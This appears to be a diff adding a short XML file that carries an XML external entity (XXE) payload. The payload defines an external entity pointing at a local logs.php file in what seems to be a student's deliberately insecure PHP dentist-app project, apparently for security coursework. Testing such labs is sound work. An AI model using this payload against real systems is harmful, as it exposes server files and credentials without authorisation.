@@ -1,0 +1,7 @@
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///D:/Air University/Semester 4/SSDD/project/dentist_app/backend/insecure-php/public/logs.php">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+
